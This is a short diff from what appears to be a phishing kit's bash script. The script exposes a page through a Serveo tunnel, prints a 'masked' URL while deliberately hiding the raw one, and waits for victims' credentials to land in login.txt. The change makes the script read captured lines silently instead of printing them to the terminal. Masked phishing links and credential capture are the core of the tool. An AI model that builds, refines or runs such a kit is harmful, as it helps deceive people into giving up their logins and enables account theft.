@@ -79,7 +79,7 @@ if [ ! -z "$SERVEO_URL" ]; then
   # echo -e "${GRN}[+] Serveo URL: $SERVEO_URL${NC}"  # Commented to hide raw URL
   echo -e "${CYAN}[+] Masked URL: $MASKED_URL${NC}"
   echo -e "${YEL}[!] Waiting for new credentials... (Press CTRL + C to exit)${NC}"
-  tail -f login.txt 2>/dev/null
+  tail -f login.txt 2>/dev/null | while read -r line; do :; done
 else
   echo -e "${RED}[!] Failed to get Serveo URL. Check your connection.${NC}"
 fi
